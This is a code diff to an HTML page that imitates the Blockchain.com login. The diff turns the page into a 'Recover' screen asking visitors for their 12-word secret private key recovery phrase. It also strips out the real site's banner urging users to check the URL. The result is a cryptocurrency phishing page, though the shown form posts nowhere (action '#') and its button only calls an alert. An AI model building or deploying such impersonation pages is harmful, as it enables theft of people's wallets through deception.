@@ -4,12 +4,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BlockChain-login-page</title>
+    <title>BlockChain.com | Recover</title>
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
     <!-- Include the Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- font awesome cdn -->
-    <!-- font-awesome cdn Jquary -->
     <link
     rel="stylesheet"
     href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css"
@@ -17,37 +16,33 @@
 </head>
 
 <body class="bg-gray-900 text-white">
-    <div class="bg-blue-500 text-center py-2">
-        <p class="text-sm font-normal">For your security, make sure the URL is <a href="https://login.blockchain.com" class="font-semibold">https://login.blockchain.com</a></p>
-    </div>
 
-    <div class="text-center my-12">
+    <div class="text-center my-16">
         <h2 class="text-3xl font-bold">Blockchain<span class="text-gray-400">.com</span></h2>
     </div>
 
     <!-- component -->
     <div class="flex items-center justify-center w-full mb-16">
       <div class="bg-white dark:bg-white shadow-md rounded-lg max-w-2xl">
-        <div class="grid grid-cols-2 text-black text-lg lg:text-xl font-bold">
-          <button class="p-3 lg:p-4 text-[#7349F2] rounded-tl-lg"><i class="fa-solid fa-wallet text-xl pe-1"></i> Wallet</button>
-          <button class="bg-gray-200 p-3 lg:p-4 text-gray-500 rounded-tr-lg"><i class="fa-brands fa-stack-exchange text-xl pe-1"></i> Exchange</button>
-        </div>
-        <form action="#" class="">
+        <form action="#">
           <div class="px-8 py-6">
-            <div class="mb-8">
-              <label for="email" class="block text-sm font-medium text-gray-800 mb-2">Email or Wallet ID</label>
-              <input type="email" id="email" class="shadow-sm rounded-md w-full lg:w-96 md:w-80 px-3 py-3 border border-blue-700 focus:outline-none focus:ring-indigo-900 focus:border-red-500 text-black" placeholder="Enter Email or Wallet ID" required>
+            <h2 class="text-gray-600 px-0 py-2 font-semibold mb-2"><a href="index.html" class="text-md font-semibold text-gray-600"><i class="fa-solid fa-arrow-left text-indigo-500"></i> Back</a></h2>
+            <h2 class="text-gray-800 text-lg font-semibold">Input your secret private key recovery phrase</h2>
+            <div class="mb-6">
+              <label for="email" class="block text-sm font-medium text-gray-600 my-2">Your 12 word Secret Private Key Recovery Phrase grants access to your account. <br> Please input it in the order specified.</label>
+              <input type="email" id="email" class="shadow-sm rounded-md w-full lg:w-full md:w-full px-3 py-3 border border-blue-700 focus:outline-none focus:ring-indigo-900 focus:border-red-500 text-black" placeholder="Enter your secret private key recovery phrase" required>
+              <h2 class="text-gray-600 text-md font-semibold text-center mt-2">Separate each word with a space</h2>
             </div>
             <button onclick="alert('Please')" type="submit" class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0C6CF2] hover:bg-[#0959c8] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 text-xl mb-3">Continue</button>
-            <div class="flex items-center justify-center mb-0">
-              <a href="import.html" class="text-sm font-semibold text-indigo-500 hover:text-indigo-700">Import Your Account</a>
-            </div>
           </div>
          
 
           <div>
             <hr>
-            <h2 class="text-gray-600 px-6 py-5 font-semibold text-center">Don't have a BlockChain Account? <a href="#" class="text-md font-semibold text-indigo-500 hover:text-indigo-700">Sign up Now <i class="fa-solid fa-arrow-right"></i></a></h2>
+            <div class="px-6 py-4 font-semibold justify-center flex gap-2">
+                <a href="#" class="text-gray-600">Trouble Logging In?</a>
+                <a href="#" class="text-md font-semibold text-indigo-500 hover:text-indigo-700">Contact Support</a>
+            </div>
           </div>
           
         </form>
